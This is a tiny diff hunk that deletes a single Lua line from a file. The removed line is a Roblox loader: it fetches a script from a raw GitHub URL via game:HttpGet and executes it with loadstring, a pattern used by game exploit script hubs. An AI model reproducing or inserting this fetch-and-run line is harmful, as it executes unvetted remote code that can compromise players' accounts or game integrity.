@@ -1,1 +1,1 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/DimaT0pScxripts/SCR1PTWSREDW00D/main/SXRED'),true))()
+
